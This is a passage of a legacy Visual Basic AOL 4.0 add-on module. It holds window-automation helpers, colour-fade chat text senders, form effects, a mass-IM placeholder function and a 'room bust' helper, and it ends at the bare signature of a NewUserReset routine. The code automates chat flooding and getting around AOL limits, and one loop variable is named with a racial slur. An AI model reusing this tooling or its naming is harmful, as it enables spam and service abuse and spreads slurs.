DivideNum(1) = SplitNum(1) / 100
DivideNum(2) = SplitNum(2) / 100
DivideNum(3) = SplitNum(3) / 100
FadeW = pic.Width / 100

For Loo = 0 To 99
'Draws Fade
pic.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
End Sub
Public Function FindandAddSN(txt As String, SN As String) As String
'this will find The phrase "{SN}" in a
'text and replace it with the SN u pass in
'Great For Mass IM and IM answer

If txt Like "*" + "{SN}" + "*" Then
For a = 1 To Len(txt)
DoEvents
strchar = Mid(txt, a, 1)
If strchar = "{" Then
B = a + 1
strchar = Mid(txt, B, 1)
If strchar = "S" Then
c = B + 1
strchar = Mid(txt, c, 1)
If strchar = "N" Then
D = c + 1
strchar = Mid(txt, D, 1)
If strchar = "}" Then
Firstpart = Mid(txt, 1, a - 1)
lastpart = Mid(txt, a + 4)
fintxt = Firstpart + SN + lastpart
FindandAddSN = fintxt
Exit Function
End If
End If
End If
End If
Next
End If
FindandAddSN = txt
End Function

Function Chat_RoomCount()
'This returns the number of people currently in the
'chat room you are in
Chat% = AOL4_FindRoom()
List% = FindChildByClass(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AOLRoomCount = Count%
End Function
Public Function AOLRoomFull()
'Add this to your room bust and it will close the
'message box that is telling you the room is full
Do
Pause 0.00002
msg1% = findwindow("#32770", "America Online")
Button% = FindChildByClass(msg1%, "Button")
Stat% = FindChildByClass(msg1%, "Static")
statcap% = FindChildByTitle(msg1%, "The room you requested is full.")

If Stat% <> 0 And Button% <> 0 And statcap% <> 0 Then Call AOLIcon(Button%)
Loop Until msg1% = 0
End Function

Sub AOL4_KillDLadvertise()
'kill download advertisement
home% = FindChildByTitle(AOLMDI, "File Transfer")
Dl% = FindChildByClass(home%, "_AOL_Image")
Call SendMessage(Dl%, WM_Close, 0, 0)
End Sub


Sub AOLShowWelcome()
X = FindChildByTitle(AOLMDI(), "Welcome, " & AOLUserSN & "!")
Call showwindow(X, SW_SHOW)
End Sub

Sub AOLHideWelcome2()
X = FindChildByTitle(AOLMDI(), "Welcome, " & AOLGetUser Or AOL4_GetUser & "!")
Call showwindow(X, SW_HIDE)
End Sub

Function Scrambletext(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Scrambles the text
For scrambling = 1 To Len(thetext)
thechar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)

'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
scrambled$ = scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
Scrambletext = scrambled$

Exit Function
End Function


Sub AOL4_Invite(Person)
FreeProcess
On Error GoTo ErrHandler
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
bud% = FindChildByTitle(mdi%, "Buddy List Window")
e = FindChildByClass(bud%, "_AOL_Icon")
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
AOLIcon (e)
timeout (1#)
Chat% = FindChildByTitle(mdi%, "Buddy Chat")
aoledit% = FindChildByClass(Chat%, "_AOL_Edit")
If Chat% Then GoTo FILL
FILL:
Call AOL4_SetText(aoledit%, Person)
de = FindChildByClass(Chat%, "_AOL_Icon")
AOLIcon (de)
killit% = FindChildByTitle(mdi%, "Invitation From:")
AOL4_KillWin (killit%)
FreeProcess
ErrHandler:
Exit Sub
End Sub

Sub AOL4_KillWin(windo)
'Closes a window....ex: AOL4_Killwin (IM%)
CloseTheMofo = sendmessagebynum(windo, WM_Close, 0, 0)
End Sub
Sub AOL4_SetText(win, txt)
'This is usually used for an _AOL_Edit or RICHCNTL
thetext% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub

Function AOL4_UpChat()
'this is an upchat that minimizes the
'upload window
die% = findwindow("_AOL_MODAL", vbNullString)
X = showwindow(die%, SW_HIDE)
X = showwindow(die%, SW_MINIMIZE)
Call AOL4_SetFocus
End Function

Sub FormRollDown(frm As Form, STEPS As Integer)
On Error Resume Next
BgColor = frm.BackColor
frm.BackColor = RGB(0, 0, 0)
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = False
Next X
AddX = True
AddY = True
frm.Show
X = ((Screen.Width - frm.Width) - frm.Left) / STEPS
Y = ((Screen.Height - frm.Height) - frm.Top) / STEPS
Do
    frm.Move frm.Left + X, frm.Top + Y
Loop Until (frm.Left >= (Screen.Width - frm.Width)) Or (frm.Top >= (Screen.Height - frm.Height))
frm.Left = Screen.Width - frm.Width
frm.Top = Screen.Height - frm.Height
frm.BackColor = BgColor
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = True
Next X
End Sub
Sub AOLSignOff()
aol% = findwindow("AOL Frame25", vbNullString)
If aol% = 0 Then MsgBox "AOL Client error: Please open Windows America Online before continuing.", 64, "Error: Windows America Online": Exit Sub
Call RunMenu3(2, 0)

Exit Sub
'ignore since of new aol....
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
pfc% = FindChildByTitle(aol%, "Sign Off?")
If pfc% <> 0 Then
icon1% = FindChildByClass(pfc%, "_AOL_Icon")
icon1% = getwindow(icon1%, 2)
icon1% = getwindow(icon1%, 2)
icon1% = getwindow(icon1%, 2)
icon1% = getwindow(icon1%, 2)
icon1% = getwindow(icon1%, 2)
clickicon% = SendMessage(icon1%, WM_LBUTTONDOWN, 0, 0&)
clickicon% = SendMessage(icon1%, WM_LBUTTONUP, 0, 0&)
Exit Do
End If
Loop

End Sub
Sub HideWelcome()
Welc& = FindChildByTitle(AOLMDI, "Welcome,")
Ret& = showwindow(Welc&, 0)
Ret& = SetFocusAPI(aol&)
End Sub

Public Function GetSystemDir() As String
    Dim sDir As String * 255
    Dim iRturn As Integer
    Dim Sze As Long
    sDir = Space$(255)
    Sze = Len(sDir)
  iRturn = GetSystemDirectory(sDir, Sze)
GetSystemDir = Left$(sDir, InStr(1, sDir, Chr$(0)) - 1)
End Function



Public Function GetWindowsDir() As String

    Dim sDir As String * 255

    Dim iReturn As Integer

    Dim lSize As Long

    

    sDir = Space$(255)

    lSize = Len(sDir)

    iReturn = GetWindowsDirectory(sDir, lSize)

    

    GetWindowsDir = Left$(sDir, InStr(1, sDir, Chr$(0)) - 1)



End Function


Function AOLVersion2()
If AOLWindow = 0 Then Exit Function
ToolBar30& = FindChildByClass(AOLWindow, "AOL Toolbar")
ToolBar40& = FindChildByClass(ToolBar30&, "_AOL_Toolbar")

If ToolBar40& <> 0 Then
    WhichAoL = "4.0"
Else
    WhichAoL = "4.0"
End If
End Function
Sub FadeFormFire(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255, 255 - intLoop, 0), B 'Draw boxes with specified color of loop
        Next intLoop
End Sub
Sub FadeFormIce(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 255), B 'Draw boxes with specified color of loop
        Next intLoop
End Sub
Function Fade_ThreeColors(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, thetext$, Wavy As Boolean)
    textlen% = Len(thetext)
    fstlen% = (Int(textlen%) / 2)
    part1$ = Left(thetext, fstlen%)
    part2$ = Right(thetext, textlen% - fstlen%)
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen% * i) + b1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / textlen% * i) + b2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    
    Fade_ThreeColors = Faded1$ + Faded2$
End Function

Function Fade_ThreeColorsBack(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, thetext$, Wavy As Boolean)
    textlen% = Len(thetext)
    fstlen% = (Int(textlen%) / 2)
    part1$ = Left(thetext, fstlen%)
    part2$ = Right(thetext, textlen% - fstlen%)
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen% * i) + b1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / textlen% * i) + b2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    
    
    Fade_ThreeColorsBack = Faded1$ + Faded2$
End Function



Function Fade_TwoColors(R1%, G1%, b1%, R2%, G2%, b2%, thetext$, Wavy As Boolean)
    textlen$ = Len(thetext)
    For i = 1 To textlen$
        TextDone$ = Left(thetext, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen$ * i) + b1, ((G2 - G1) / textlen$ * i) + G1, ((R2 - R1) / textlen$ * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded$ = Faded$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    Fade_TwoColors = Faded$
End Function

Function Fade_TwoColorsBack(R1%, G1%, b1%, R2%, G2%, b2%, thetext$, Wavy As Boolean)
    textlen$ = Len(thetext)
    For i = 1 To textlen$
        TextDone$ = Left(thetext, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / textlen$ * i) + b1, ((G2 - G1) / textlen$ * i) + G1, ((R2 - R1) / textlen$ * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If Wavy = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        
        Faded$ = Faded$ + "<Font Back=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next i
    Fade_TwoColorsBack = Faded$
End Function


Sub FadeFormPlatinum(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B 'Draw boxes with specified color of loop
    Next intLoop
End Sub







Function BlackBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackBlue = Msg
SendChat (Msg)
End Function

Function BlackBlueBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    SendChat (Msg)
End Function

Function BlackGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, F, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackGreen = Msg
SendChat (Msg)
End Function
Function BlackGreenBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackGreenBlack = Msg
SendChat (Msg)
End Function
Function BlackGrey(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 220 / a
        F = e * B
        G = RGB(F, F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackGrey = Msg
End Function

Function BlackGreyBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackGreyBlack = Msg
SendChat (Msg)
End Function
Function BlackPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 0, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackPurple = Msg
SendChat (Msg)
End Function

Function BlackPurpleBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackPurpleBlack = Msg
SendChat (Msg)
End Function

Function BlackRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 0, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackRed = Msg
SendChat (Msg)
End Function
Function BlackRedBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackRedBlack = Msg
SendChat (Msg)
End Function
Function BlackYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackYellow = Msg
SendChat (Msg)
End Function
Function BlackYellowBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlackYellowBlack = Msg
SendChat (Msg)
End Function
Function BlueBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlueBlack = Msg
SendChat (Msg)
End Function
Function BlueBlackBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlueBlackBlue = Msg
SendChat (Msg)
End Function
Function BlueGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, F, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlueGreen = Msg
End Function

Function BlueGreenBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlueGreenBlue = Msg
SendChat (Msg)
End Function

Function BluePurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255, 0, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BluePurple = Msg
SendChat (Msg)
End Function

Function BluePurpleBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BluePurpleBlue = Msg
SendChat (Msg)
End Function
Function BlueRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 0, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlueRed = Msg
SendChat (Msg)
End Function

Function BlueRedBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlueRedBlue = Msg
SendChat (Msg)
End Function
Function BlueYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlueYellow = Msg
SendChat (Msg)
End Function
Function BlueYellowBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    BlueYellowBlue = Msg
SendChat (Msg)
End Function

Sub SendChatBold(BoldChat)
'It will come out bold on the chat screen.
SendChat ("<b>" & BoldChat & "</b>")
End Sub
Sub SendChatRed(red)
SendChat ("<font color=""#FF0000"">" & red & "</font>")
End Sub
Sub SendChatGreen(Chat)
SendChat ("<font color=""#00FF00"">" & Chat & "</font>")
End Sub
Sub SendChatBlue(Chat)
SendChat ("<font color=""#0000FF"">" & Chat & "</font>")
End Sub

Sub SendChatAqua(Chat)
SendChat ("<font color=""#00FFFF"">" & Chat & "</font>")
End Sub

Sub SendChatYellow(Chat)
SendChat ("<font color=""#FFFF00"">" & Chat & "</font>")
End Sub

Sub SendChatPurple(Chat)
SendChat ("<font color=""#FF00FF"">" & Chat & "</font>")
End Sub
Sub SendChatFont(Font, Chat)
SendChat ("<font face=""" + Font + """>" & Chat & "</font>")
End Sub
Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub


Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub


Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub



Sub ChatTextWithVBMSG()
'Put this code in VBMSG and in properties under Message
'Selecter add WM_SETTEXT then in a button put
'VBMSG1.SubClasshWnd = FindChildByClass(FindChatWnd(),"_AOL_VIEW")
'
message$ = agGetStringFromLPSTR(lParam)
SN$ = Mid(message$, 3, InStr(message$, ":") - 3)
txt$ = Mid(message$, InStr(message$, ":") + 2)
'
'You can put text boxes in so u can see the text
'Text1 = SN$
'Text2 = TXT

'Example:

'If Ucase(TXT$) Like ucase("/Fortune") Then
'AOLChatSend "You will die soon"
'End if
End Sub

Function AGGetStringFromLPSTR_2(lpStrings As Long) As String
   Dim lpStrAddress As Long, lpStrz$
   lpStrz$ = Space$(4096)
   lpStrAddress = lpStrings
   lpStrAddress = lstrcpy(lpStrz$, lpStrAddress)
   lpStrz$ = Trim$(lpStrz$)
   lpStrz$ = Left$(lpStrz$, Len(lpStrz$) - 1)
   AGGetStringFromLPSTR_2 = lpStrz$
End Function

Sub FormExplode(frm As Form, CFlag As Integer, STEPS As Integer)
'Example: Call FormExplode(Me, True, 400)

Dim FRect As Rect
Dim FWidth, fHeight As Integer
Dim i, X, Y, cX, cY As Integer
Dim hScreen, Brush As Integer, OldBrush
    GetWindowRect frm.hwnd, FRect
    FWidth = (FRect.Right - FRect.Left)
    fHeight = FRect.Bottom - FRect.Top
    hScreen = GetDC(0)
    Brush = CreateSolidBrush(frm.BackColor)
    OldBrush = SelectObject(hScreen, Brush)
    For i = 1 To STEPS
        cX = FWidth * (i / STEPS)
        cY = fHeight * (i / STEPS)
        If CFlag Then
            X = FRect.Left + (FWidth - cX) / 2
            Y = FRect.Top + (fHeight - cY) / 2
        Else
            X = FRect.Left
            Y = FRect.Top
        End If
        Rectangle hScreen, X, Y, X + cX, Y + cY
    Next i
    If ReleaseDC(0, hScreen) = 0 Then
        MsgBox "Unable to Release Device Context", 16, "Device Error"
    End If
    Dl% = DeleteObject(Brush)
    frm.Show
End Sub
Sub AOLHideToolBar()
aol% = findwindow("AOL Frame25", vbNullString)
Toolbar% = FindChildByClass(aol%, "AOL Toolbar")
hde% = showwindow(Toolbar%, SW_HIDE)
End Sub
Sub AOLHideWelcome()
Dim X
wlcm% = FindChildByTitle(findwindow("AOL Frame25", "America  Online"), "Welcome, ")
X = showwindow(wlcm%, SW_HIDE)
End Sub
Function File_Exists(ByVal sFileName As String) As Integer
'Ex...: IfFileExists("win.com") Then.....
Dim i As Integer
On Error Resume Next

    i = Len(Dir$(sFileName))
    
    If Err Or i = 0 Then
        IfFileExists = False
        Else
            IfFileExists = True
    End If
End Function
Sub RemoveDuplicateNames(lst As Control)
'Removes Duplicate Names from a Listbox
'Ex....: Call RemoveDuplicateNames(List1)
For i = 0 To lst.ListCount - 1
For Nig = 0 To lst.ListCount - 1

If LCase(lst.List(i)) Like LCase(lst.List(Nig)) And i <> Nig Then

lst.RemoveItem (Nig)
End If

Next Nig
Next i
End Sub
Sub Killwait3()

'Example: Killwait
RunMenu "&About America Online"
Do: DoEvents
s = findwindow("_AOL_MODAL", 0&)
Loop Until s <> 0
ico = FindChildByClass(s, "_AOL_ICON")
Do
DoEvents
Click ico
Loop Until s = 0
End Sub
Sub FormFadeBlink(theForm As Form)
'Really Cool
theForm.BackColor = &H0&
theForm.DrawStyle = 6
theForm.DrawMode = 13

theForm.DrawWidth = 2
theForm.ScaleMode = 3
theForm.ScaleHeight = (256 * 2)
For a = 255 To 0 Step -1
theForm.Line (0, B)-(theForm.Width, B + 2), RGB(a + 3, a, a * 3), BF

B = B + 2
Next a

For i = 255 To 0 Step -1
theForm.Line (0, 0)-(theForm.Width, Y + 2), RGB(i + 3, i, i * 3), BF
Y = Y + 2
Next i

End Sub

Sub NewUserReset(AOLPath As String, Replace)
